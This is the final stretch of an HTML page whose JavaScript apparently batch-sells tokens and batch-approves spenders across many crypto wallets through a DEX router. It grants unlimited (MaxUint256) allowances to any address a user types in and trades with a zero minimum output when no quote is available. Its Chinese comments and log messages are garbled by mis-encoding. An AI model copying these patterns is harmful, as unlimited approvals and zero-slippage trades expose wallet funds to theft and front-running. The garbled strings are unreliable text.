                            const approveTx = await tokenWithSigner.approve(CONFIG.routerAddress, ethers.MaxUint256);
                            await approveTx.wait();
                            addLog(`${w.address.slice(0, 8)}... æˆæƒæˆåŠŸ`, 'success');
                        }

                        // æ‰§è¡Œå–å‡º
                        const router = new ethers.Contract(CONFIG.routerAddress, ROUTER_ABI, w.wallet);
                        const path = [tokenAddress, CONFIG.wethAddress];
                        
                        // è·å–é¢„æœŸè¾“å‡º
                        let amountOutMin = 0n;
                        try {
                            const amounts = await router.getAmountsOut(sellAmount, path);
                            if (slippage < 100) {
                                amountOutMin = amounts[1] * BigInt(Math.floor((100 - slippage) * 100)) / 10000n;
                            }
                            const expectedGT = ethers.formatEther(amounts[1]);
                            addLog(`${w.address.slice(0, 8)}... é¢„æœŸè·å¾— ${expectedGT} GT`, 'info');
                        } catch (e) {
                            addLog(`${w.address.slice(0, 8)}... æ— æ³•è·å–æŠ¥ä»·ï¼Œä½¿ç”¨0æœ€å°è¾“å‡º`, 'warning');
                        }
                        
                        const deadline = Math.floor(Date.now() / 1000) + 1200;
                        
                        addLog(`${w.address.slice(0, 8)}... å‘é€å–å‡ºäº¤æ˜“`, 'info');
                        
                        // ä½¿ç”¨æ”¯æŒæ‰‹ç»­è´¹çš„swapå‡½æ•°
                        const tx = await router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                            sellAmount,
                            amountOutMin,
                            path,
                            w.address,
                            deadline
                            // ç§»é™¤å›ºå®šçš„gasLimitï¼Œè®©ç³»ç»Ÿè‡ªåŠ¨ä¼°ç®—
                        );
                        
                        const receipt = await tx.wait();
                        addLog(`${w.address.slice(0, 8)}... å–å‡ºæˆåŠŸ âœ“ Hash: ${receipt.hash.slice(0, 10)}...`, 'success');
                        return receipt.hash;
                        
                    } catch (e) {
                        if (e.message && e.message.includes('GateSwap: K')) {
                            addLog(`${w.address.slice(0, 8)}... å–å‡ºå¤±è´¥: æµåŠ¨æ€§ä¸è¶³ï¼Œè¯·å‡å°‘å–å‡ºé‡‘é¢`, 'error');
                        } else {
                            addLog(`${w.address.slice(0, 8)}... å–å‡ºå¤±è´¥: ${e.message || e}`, 'error');
                        }
                        throw e;
                    }
                });

                const results = await batchExecute(tasks, maxConcurrent);
                const successCount = results.filter(r => r && r.success).length;
                const failCount = results.filter(r => r && !r.success).length;
                
                addLog(`æ‰¹é‡å–å‡ºå®Œæˆ: ${successCount} æˆåŠŸ, ${failCount} å¤±è´¥`, 
                    failCount === 0 ? 'success' : 'warning');
                
                refreshBalances();
            }

            // æ‰§è¡Œæˆæƒ
            async function executeApprove() {
                const selected = wallets.filter(w => w.selected);
                if (selected.length === 0) {
                    alert('è¯·é€‰æ‹©é’±åŒ…');
                    return;
                }

                const tokenAddress = document.getElementById('approveTokenAddress').value;
                const spender = document.getElementById('approveSpender').value;
                const maxConcurrent = 5;

                if (!tokenAddress || !spender) {
                    alert('è¯·å¡«å†™å®Œæ•´ä¿¡æ¯');
                    return;
                }

                addLog(`å¼€å§‹æ‰¹é‡æˆæƒï¼Œå…± ${selected.length} ä¸ªé’±åŒ…`, 'info');

                const tasks = selected.map(w => async () => {
                    try {
                        const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, w.wallet);
                        
                        addLog(`${w.address.slice(0, 8)}... å‘é€æˆæƒäº¤æ˜“`, 'info');
                        
                        const tx = await tokenContract.approve(spender, ethers.MaxUint256);
                        await tx.wait();
                        
                        addLog(`${w.address.slice(0, 8)}... æˆæƒæˆåŠŸ âœ“`, 'success');
                        return tx.hash;
                        
                    } catch (e) {
                        addLog(`${w.address.slice(0, 8)}... æˆæƒå¤±è´¥: ${e.message}`, 'error');
                        throw e;
                    }
                });

                const results = await batchExecute(tasks, maxConcurrent);
                const successCount = results.filter(r => r.success).length;
                const failCount = results.filter(r => !r.success).length;
                
                addLog(`æ‰¹é‡æˆæƒå®Œæˆ: ${successCount} æˆåŠŸ, ${failCount} å¤±è´¥`, 
                    failCount === 0 ? 'success' : 'warning');
            }

            // å¯åŠ¨åˆå§‹åŒ–
            init();
        });
    </script>
</body>
</html>